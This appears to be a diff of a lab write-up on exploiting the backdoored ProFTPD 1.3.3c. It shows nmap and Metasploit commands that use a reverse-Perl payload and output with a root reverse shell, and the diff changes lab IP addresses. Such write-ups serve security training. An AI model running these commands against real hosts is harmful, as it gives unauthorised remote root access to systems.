@@ -8,9 +8,9 @@ Unauthenticated remote root compromise via the trojanised ProFTPD 1.3.3c source 
 
 | Item | Value |
 |---|---|
-| Target | 192.168.144.131 |
+| Target | 192.168.144.200 |
 | Service | ProFTPD 1.3.3c, port 21/tcp |
-| Attacker | Kali, 192.168.144.129 |
+| Attacker | Kali VM on the same host-only lab network |
 | Tooling | nmap, Metasploit Framework |
 
 ## Vulnerability
@@ -22,7 +22,7 @@ Between 28 November and 2 December 2010, the official ProFTPD distribution serve
 Service and version detection against the FTP port confirms the affected build:
 
 ```
-nmap -sC -sV -O -p 21 192.168.144.131
+nmap -sC -sV -O -p 21 192.168.144.200
 ```
 
 ```
@@ -36,7 +36,7 @@ PORT   STATE SERVICE VERSION
 msfconsole -q
 search proftpd 1.3.3c
 use exploit/unix/ftp/proftpd_133c_backdoor
-set RHOSTS 192.168.144.131
+set RHOSTS 192.168.144.200
 set payload cmd/unix/reverse_perl
 set LHOST 192.168.144.129
 run
@@ -46,8 +46,8 @@ run
 
 ```
 [*] Started reverse TCP handler on 192.168.144.129:4444
-[*] 192.168.144.131:21 - Sending Backdoor Command
-[*] Command shell session 1 opened (192.168.144.129:4444 -> 192.168.144.131:38808)
+[*] 192.168.144.200:21 - Sending Backdoor Command
+[*] Command shell session 1 opened (192.168.144.129:4444 -> 192.168.144.200:38808)
 
 whoami
 root
